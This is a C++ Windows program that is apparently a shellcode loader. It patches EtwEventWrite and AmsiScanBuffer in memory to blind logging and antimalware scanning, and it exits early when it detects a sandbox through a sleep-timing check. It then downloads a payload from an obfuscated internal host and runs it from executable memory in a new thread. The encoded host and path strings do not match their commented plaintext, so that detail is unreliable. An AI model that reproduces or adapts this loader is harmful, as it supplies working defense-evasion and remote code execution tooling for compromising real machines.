#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ntdll.lib")

void PatchETW()
{
    unsigned char patch[] = { 0xC3 };  // ret
    void* EtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD oldProtect;

    if (EtwEventWrite && VirtualProtect(EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(EtwEventWrite, patch, sizeof(patch));
        VirtualProtect(EtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    }
}

void PatchAMSI()
{
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    void* AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!AmsiScanBuffer) return;

    DWORD oldProtect;
    BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret

    if (VirtualProtect(AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(AmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(AmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    }
}

void BypassDynamicAnalysis()
{
    DWORD64 tick = GetTickCount64();
    Sleep(5000);
    DWORD64 tock = GetTickCount64();
    if ((tock - tick) < 4500)
        ExitProcess(0);
}

std::wstring Deobfuscate(const std::string& obfuscated, char key)
{
    std::wstring result;
    for (char c : obfuscated)
        result += wchar_t(c ^ key);
    return result;
}

std::vector<BYTE> DownloadPayload(LPCWSTR host, INTERNET_PORT port, LPCWSTR resource)
{
    std::vector<BYTE> payload;
    DWORD bytesRead = 0;

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) return payload;

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return payload;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", resource, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL))
    {
        BYTE buffer[4096];
        do {
            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead))
                break;
            payload.insert(payload.end(), buffer, buffer + bytesRead);
        } while (bytesRead > 0);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return payload;
}

int main()
{
    BypassDynamicAnalysis();
    PatchETW();
    PatchAMSI();

    
    std::wstring host = Deobfuscate("u}z}vrxxv", 0x23);    // "10.250.0.16"
    std::wstring file = Deobfuscate("b$y`h|e'|cg", 0x23);  // "/test.bin"

    INTERNET_PORT port = 8001;

    std::vector<BYTE> shellcode = DownloadPayload(host.c_str(), port, file.c_str());
    if (shellcode.empty()) {
        std::cerr << "Failed to download shellcode.\n";
        return -1;
    }

    LPVOID execMem = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) {
        std::cerr << "Memory allocation failed.\n";
        return -1;
    }

    memcpy(execMem, shellcode.data(), shellcode.size());

    DWORD oldProtect;
    if (!VirtualProtect(execMem, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Memory protection change failed.\n";
        VirtualFree(execMem, 0, MEM_RELEASE);
        return -1;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Thread creation failed.\n";
        VirtualFree(execMem, 0, MEM_RELEASE);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(execMem, 0, MEM_RELEASE);

    return 0;
}
